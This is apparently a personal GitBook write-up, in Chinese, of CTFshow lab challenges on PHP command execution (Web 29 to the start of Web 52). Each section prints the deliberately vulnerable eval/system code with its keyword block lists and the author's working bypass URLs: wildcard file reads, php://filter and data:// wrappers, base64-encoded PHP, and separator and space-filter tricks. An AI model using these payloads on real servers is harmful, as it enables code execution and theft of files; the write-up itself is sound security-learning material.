---
description: >-
  这里就记录一下ctfshow的刷题记录是web入门的命令执行专题里面的题目，他是有分类，并且覆盖也很广泛，所以就通过刷这个来，不过里面有一些脚本的题目发现我自己根本不会笑死。
---

# 😅 CTFSHOW命令执行

## <mark style="color:blue;background-color:orange;">（1）Web 29</mark>

### 1.代码解释

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这段代码非常简单，就是通过get获得的变量c，如果里面不含有flag这个字符，就把c变量做为php代码执行。

### 2.解答过程

所以我们先查看当前目录下的文件。

```php
http://21631e8d-00f2-42ec-991a-0bc5b5d7d661.challenge.ctf.show/?c=system("ls");
```

<figure><img src="../.gitbook/assets/image 1.png" alt=""><figcaption></figcaption></figure>

执行后，得到回显

<figure><img src="../.gitbook/assets/image 2.png" alt=""><figcaption></figcaption></figure>

可以看到，当前目录下有flag.php和index.php文件，很明显，我们要查看flag.php的内容，但是我们的c变量不能含有flag这个词，我们可以用通配符来处理这个问题，并且没有过滤cat等，所以直接查看。

```php
http://21631e8d-00f2-42ec-991a-0bc5b5d7d661.challenge.ctf.show/?c=system("cat f*");
```

<figure><img src="../.gitbook/assets/image 3.png" alt=""><figcaption></figcaption></figure>

然后我们发现我们页面没有显示，可能是没有php代码，所以我们查看源码，发现flag。

```php
$flag = 'ctfshow{2d67c35d-5ae0-4429-88d3-53be43c7a618}';
```

<figure><img src="../.gitbook/assets/image 4.png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（2）Web 30</mark>

<figure><img src="../.gitbook/assets/image 5.png" alt=""><figcaption></figcaption></figure>

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这段代码和上一题代码的区别就是，过滤了`flag，system`，和`php`。

既然我们system用不了了，我们看可以用其他的php执行函数来代替吗。

可以试试passthru

```php
http://2f1af390-2e2d-4d53-b104-a31ed9917f2b.challenge.ctf.show/?c=passthru("ls");
```

<figure><img src="../.gitbook/assets/image 6.png" alt=""><figcaption></figcaption></figure>

可以发现是成功的，我们还是按照上面的步骤继续执行。得到flag。

```php
http://2f1af390-2e2d-4d53-b104-a31ed9917f2b.challenge.ctf.show/?c=passthru("cat f*");
```

<figure><img src="../.gitbook/assets/image 7.png" alt=""><figcaption></figcaption></figure>

```php
$flag = 'ctfshow{8fc40658-23ec-4363-92e2-93a9320f5d4e}';
```

***

## <mark style="color:blue;background-color:orange;">（3）web 31</mark>

<figure><img src="../.gitbook/assets/image 8.png" alt=""><figcaption></figcaption></figure>

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

可以看到过滤变多了，并且过滤了单引号和点和空格，单引号我们可以用双引号代替，空格也有很多可以代替的，cat可以用more等来代替，我们之前用的函数passthru可以不变。

所以得到最后的过滤语句为

```php
http://af3fbe54-a16b-4cfb-bae0-180dc1e8ba0b.challenge.ctf.show/?c=passthru("ls");
```

<figure><img src="../.gitbook/assets/image 9.png" alt=""><figcaption></figcaption></figure>

可以看到出现我们想要的结果了，说明这个思路对了。然后利用查看的php代码。

```php
http://af3fbe54-a16b-4cfb-bae0-180dc1e8ba0b.challenge.ctf.show/?c=echo(`less,f*`);
```

<figure><img src="../.gitbook/assets/image 10.png" alt=""><figcaption></figcaption></figure>

其实在这个地方的时候遇到了一个问题，就是如果我用`<>`或者`%20`或者`$IFS`都出不来，只有`%09`能出来结果，并且我用其他的过滤方式会导致生成新的文件，这是我没想通的。

***

## <mark style="color:blue;background-color:orange;">（4）web 32</mark>

<figure><img src="../.gitbook/assets/image 11.png" alt=""><figcaption></figcaption></figure>

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

还是一样的过滤，大部分的过滤方式，其实现在都讲了，就是这个echo，我们可以换成print，但是我们用的一些函数都需要括号，所以之前的方法单纯过滤肯定不顶用。

后面看到wp发现可以用include，包含一个参数，参数传递php协议去筛选出本地文件

这个方法因为之前没有使用过。所以需要学习一下。

首先解释一下

```php
include "$_GET[X]"?>
include "$_POST[x]"?>
```

这两个是一个php查询参数的语句，其中的x就是查询的参数名。又因为，include是要包含文件，所以x传递的应该是一个文件路径。

以上语句的双引号可以去掉，在某些单引号和双引号被过滤的情况下。

上面的?>是为了结束php的代码块，明确告诉解析器，我们的php代码结束了，我们接下来传入的参数是php的代码

***

***

有了以上的基础后，我们得到的答案代码片段是

```php
http://e688fc70-5820-4a9b-96ae-5d688f4d2743.challenge.ctf.show/?c=include"$_GET[url]"?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

<figure><img src="../.gitbook/assets/image 12.png" alt=""><figcaption></figcaption></figure>

可以看到，我们将flag.php的内容转化为base64编码展示出来了。

```php
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7OTJkMTBlNjEtMTg1Zi00NTU4LTk4MGMtZWQ1Y2IyMjllNGQ3fSI7DQo=
```

然后进行base64解码，发现是

<figure><img src="../.gitbook/assets/image 13.png" alt=""><figcaption></figcaption></figure>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag="ctfshow{92d10e61-185f-4558-980c-ed5cb229e4d7}";

```

***

## <mark style="color:blue;background-color:orange;">（5）web 33</mark>

<figure><img src="../.gitbook/assets/image 14.png" alt=""><figcaption></figcaption></figure>

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

可以发现我们上一题的方法除了引号，都可以不变，引号也可以不写没有影响。

所以得到最后的php代码是

```PHP
http://69702ce9-0872-49d2-82f6-330bd7fa2948.challenge.ctf.show/?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

<figure><img src="../.gitbook/assets/image 15.png" alt=""><figcaption></figcaption></figure>

得到的base64编码为

```PHP
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7NjU0MjFkNzgtYjEyZC00YmYyLTg1MzctZjc5YjU3OTNkZGE3fSI7DQo=
```

解码为

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag="ctfshow{65421d78-b12d-4bf2-8537-f79b5793dda7}";
```

***

## <mark style="color:blue;background-color:orange;">（6）web 34</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image 16 (1).png" alt=""><figcaption></figcaption></figure>

还是不影响。继续

```php
http://43cacb9f-c090-468b-a04a-faa15c20c924.challenge.ctf.show/?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

<figure><img src="../.gitbook/assets/image 17.png" alt=""><figcaption></figcaption></figure>

得到base64编码为

```php
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDA6NDk6MjYNCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7OTU4N2JlNWEtYjdlMS00YzdjLWJkN2ItYmZkZTFmNmZlYWU4fSI7DQo=
```

解码得

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag="ctfshow{9587be5a-b7e1-4c7c-bd7b-bfde1f6feae8}";

```

***

## <mark style="color:blue;background-color:orange;">（7）web 35</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image 18.png" alt=""><figcaption></figcaption></figure>

还是用include包含文件，因为include，get，$都没有被过滤

```php
http://2d5454bc-8fbe-4459-b3d7-d4e521092dbd.challenge.ctf.show/?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

<figure><img src="../.gitbook/assets/image 19.png" alt=""><figcaption></figcaption></figure>

```php
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDM6Mzc6MTENCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7OTE4NjVmOWItM2VlYi00OTAwLWJjMGQtYTQyYTM2MWFkODU3fSI7
```

解码得

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 03:37:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag="ctfshow{91865f9b-3eeb-4900-bc0d-a42a361ad857}";
```

***

## <mark style="color:blue;background-color:orange;">（8）web 36</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 04:21:16
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image 20.png" alt=""><figcaption></figcaption></figure>

还是上述方法

```php
http://39b0158b-cc0b-4dc2-860a-891936d43861.challenge.ctf.show/?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
```

<figure><img src="../.gitbook/assets/image 21.png" alt=""><figcaption></figcaption></figure>

```php
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0wNCAwMDo0OToxOQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMDQgMDM6Mzc6MTENCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KJGZsYWc9ImN0ZnNob3d7NzVkYWIyMTMtYjgwOS00NmJjLWFlMWQtOGQ0YmZkZmZkZDlkfSI7
```

base64解码得

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:49:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 03:37:11
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag="ctfshow{75dab213-b809-46bc-ae1d-8d4bfdffdd9d}";
```

***

## <mark style="color:blue;background-color:orange;">（9）Web 37</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image 22.png" alt=""><figcaption></figcaption></figure>

我们可以看到，这个题得代码不一样了，如果变量c不含有flag，直接将变量c用include包含进去，所以我们c应该是一个文件路径，并且不含有flag。然后直接打印出变量flag。不含有执行函数了，所以我们需要直接把文章内容展示出来。

所以这个时候可以用到data://伪协议。

因为data后面可以直接执行php代码，并且会被当成文件执行

所以我们可以写出代码

```php
http://d3abe00c-1c18-4266-bca4-8ca9dfd737aa.challenge.ctf.show/?c=data://text/plain,<?php system("ls")?>
```

<figure><img src="../.gitbook/assets/image 23.png" alt=""><figcaption></figcaption></figure>

发现这下又和我们之前前面的单纯输入php代码执行一样的了。

```php
http://d3abe00c-1c18-4266-bca4-8ca9dfd737aa.challenge.ctf.show/?c=data://text/plain,<?php system("cat f*")?>
```

<figure><img src="../.gitbook/assets/image 24.png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（10）Web 38</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:23:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|php|file/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image 25.png" alt=""><figcaption></figcaption></figure>

把php过滤了，我们就可以用data://的另一种base64加密的方式的语句。

```php
http://7737a3de-11a3-444b-ae4f-83ede1eaa283.challenge.ctf.show/?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==
```

得到结果

<figure><img src="../.gitbook/assets/image 26.png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（11）Web 39</mark>

<figure><img src="../.gitbook/assets/image 27.png" alt=""><figcaption></figcaption></figure>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:13:21
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c.".php");
    }
        
}else{
    highlight_file(__FILE__);
} 
```

我们可以看到上面的代码是在c变量的后面直接拼接了.php并且过滤了flag，我们需要用可以直接执行php代码，并且把他当做文件的，还是data://只不过，我们需要拼接上.php如果我们提前闭合，那么这个拼接的php不起作用。

所以我们得到的代码是

```php
http://85987e8b-1ab2-46b0-b64a-17eff930f38b.challenge.ctf.show/?c=data://text/plain,<?php system("cat f*")?>
```

<figure><img src="../.gitbook/assets/image 28.png" alt=""><figcaption></figcaption></figure>

所以就算后面是.php，我们提前闭合了，.php不起作用。

***

## <mark style="color:blue;background-color:orange;">（12）Web 40</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 06:03:36
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/


if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image 29.png" alt=""><figcaption></figcaption></figure>

很显然是个无参数读取文件，我们首先查看当前目录下的文件有哪些

```php
http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=print_r(scandir(pos(localeconv())));
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

可以看到我们要访问倒数第二个文件，所以我们接下来的代码是

```php
http://5a6291ec-129d-4e7f-b30b-7776441151ff.challenge.ctf.show/?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

得到flag。

***

## <mark style="color:blue;background-color:orange;">(13)Web 41</mark>

不会，需要脚本，先跳过了。

***

## <mark style="color:blue;background-color:orange;">（14）Web 42</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 20:51:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

要理解这段代码之前需要先了解一个I/O流的一个写法

> `>/dev/null 2>&1`
>
> 这个命令是linux/unix里面i/o重定向的语句，他的作用就是把输出和错误信息都重定向到`/dev/null`，这样做的效果是将它们都丢弃，不会显示在终端上，也不会被保存到任何文件中。

所以我们可以解释这段代码了。在system()函数执行$c变量的时候同时，将输出给丢弃掉，就是说我们如果直接这么执行是看不到回显的，所以我们需要截断后面这个。通过||只要前面成功了，后面就不执行了。

```php
http://e8adf119-3cce-41b7-a680-58eefc789d4d.challenge.ctf.show/?c=ls||
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```php
http://e8adf119-3cce-41b7-a680-58eefc789d4d.challenge.ctf.show/?c=cat flag.php||
```

<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（15）Web 43</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:51
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

就是和以前一样过滤，但是我们的||还能用，所以可以继续使用

```php
http://4dca9ec0-61b7-4341-9aa0-af0be0639a36.challenge.ctf.show/?c=more flag.php||
```

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（16）WEB 44</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:32:01
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

绕过过滤的方法前面都介绍过了这里就不赘叙了。后面也都不特意说了，大家自己看看wp就能明白

```php
http://188ca5a8-df45-49e3-9757-35702294688e.challenge.ctf.show/?c=more fla*||
```

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（17）WEB45</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:35:34
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```php
http://5266b045-bb39-4219-a054-d84f6d4d907e.challenge.ctf.show/?c=more%09f*||
```

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（18）WEB46</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:50:19
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```php
http://9cecebfd-51c1-4c91-9150-bffa8238d816.challenge.ctf.show/?c=more%09fla?.php||
```

<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">(19)WEB47</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 21:59:23
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

```php
http://26a6634b-a22b-4009-8819-254d74b86058.challenge.ctf.show/?c=nl%09fla?.php||
```

<figure><img src="../.gitbook/assets/image (16) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">(20)WEB48</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:06:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

```php
http://68c081bd-8321-4230-8e52-2daffaae81f8.challenge.ctf.show/?c=nl%09fla?.php||
```

<figure><img src="../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（21）WEB49</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:22:43
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__); 
```

<figure><img src="../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
<mark style="color:red;">**在做这一题的时候出现了一个很重要的事情，就是<>/\</>和？一起使用时，不回显，所以我们将？换成/，让<>和/一起使用才能回显**</mark>
{% endhint %}

```php
http://f9d6e425-e707-4e7e-a144-5bb5ed0f2630.challenge.ctf.show/?c=nl<>fla\g.php||
```

<figure><img src="../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（22）WEB50</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:32:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

```php
http://b631725c-44f2-4cb6-a9e6-fc6d6fdf361a.challenge.ctf.show/?c=nl<>fla\g.php||
```

<figure><img src="../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（23）WEB 51</mark>

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-05 22:42:52
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
} 
```

<figure><img src="../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

```
http://8001153d-c69b-4aae-a44e-2bd8a5af2c4c.challenge.ctf.show/?c=nl<>fla\g.php||
```

<figure><img src="../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:blue;background-color:orange;">（24）WEB52</mark>

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
